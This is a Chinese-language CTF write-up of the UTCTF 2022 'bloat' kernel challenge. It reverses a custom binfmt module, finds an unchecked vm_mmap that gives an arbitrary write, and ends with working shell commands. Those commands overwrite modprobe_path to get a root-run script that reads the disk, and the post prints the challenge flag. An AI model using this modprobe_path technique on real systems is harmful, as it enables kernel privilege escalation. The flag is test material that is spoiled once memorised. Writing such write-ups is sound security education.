---
title: UTCTF-2022-bloat-writeup
date: 2022-03-14 20:34:40
categories:
 - pwn-writeup
tags: 
 - UTCTF
 - kernel

---
<!--more-->

## 题目分析

### 准备工作
按照惯例，先解压:
```sh
mkdir rootfs
cd rootfs
mv ../rootfs.cpio.gz .
gunzip ./rootfs.cpio.gz
cpio -idmv < rootfs.cpio
```

kernel-pwn题目的突破口往往出现在出题者拓展的kernel-object中:
```sh
[rootfs]$ find ./ -name *.ko
./lib/modules/5.15.0/extra/bloat.ko
```

为了方便后面的调试，先把bzImage解压成elf，并解析出部分符号表:
```sh
vmlinux-to-elf bzImage vmlinux.bin
```
在run.sh末尾加上-s与-S选项，进入gdb:
```sh
gdb ./vmlinux.bin
(gdb)> target remote localhost:1234
```
当然，也可以直接
```c
gdb -ex 'set architecture i386:x86_64' \
-ex 'target remote localhost:1234' \
-ex 'add-symbol-file bloat.ko 0xffffffffc0000000' \
-ex 'b load_bloat_binary' \
-ex 'c' ./vmlinux.bin
```
一步到位，把断点下在load\_bloat\_binary函数上.

--------

### 漏洞分析
将bloat.ko拿进ida中分析:
```c++
v1 = strrchr(*(const char **)(a1 + 0x60), '.');// 文件后缀名判断
if ( !v1 )
	return 0xFFFFFFF8;
if ( strcmp(v1, ".bloat") )
	return 0xFFFFFFF8;
v2 = generic_file_llseek(*(_QWORD *)(a1 + 0x40), 0LL, 2LL);// 判断文件大小
generic_file_llseek(*(_QWORD *)(a1 + 0x40), 0LL, 0LL);
```
且根据a1是setup_new_exec等函数的参数，在:
[elixir.bootlin.com](https://elixir.bootlin.com/linux/v5.15/source/include/linux/binfmts.h#L17)中进行检索，确定a1的结构体:
```c
struct linux_binprm
{
	struct vm_area_struct *vma;
	unsigned __int64 vma_pages;
	struct mm_struct *mm;
	unsigned __int64 p;
	unsigned __int64 argmin;
	unsigned __int32 have_execfd : 1;
	unsigned __int32 execfd_creds : 1;
	unsigned __int32 secureexec : 1;
	unsigned __int32 point_of_no_return : 1;
	struct file *executable;
	struct file *interpreter;
	struct file *file;
	struct cred *cred;
	int unsafe;
	unsigned int per_clear;
	int argc;
	int envc;
	const char *filename;
	const char *interp;
	const char *fdpath;
	unsigned int interp_flags;
	int execfd;
	unsigned __int64 loader;
	unsigned __int64 exec;
	struct rlimit rlim_stack;
	char buf[128];
};
```

确定结构体后，发现有这样一行:
```c
vm_mmap(0LL, v6, 256LL, 7LL, 18LL, 0LL);
```
对于地址没有检查，造成了任意地址写，故考虑覆写modprobe_path.

--------

## exploition
#### 先将modprobe_path覆写为目标文件:
```sh
echo -ne "\x80\x81\x03\x82\xff\xff\xff\xff/tmp/a" > exp.bloat
```
#### 将目标操作写入a:
```sh
echo -e "#!/bin/sh\ncat /dev/sda > /tmp/flag" > /tmp/a
```
#### 触发调用modprobe_path:
```sh
touch b
chmod +x b a exp.bloat
/tmp/exp.bloat
/tmp/b
```
-------

```sh
$ cat /tmp/flag
utflag{oops_forgot_to_use_put_user283558318}
```
```sh
pwndbg> x/s &modprobe_path
0xffffffff82038180:     "/tmp/a"
```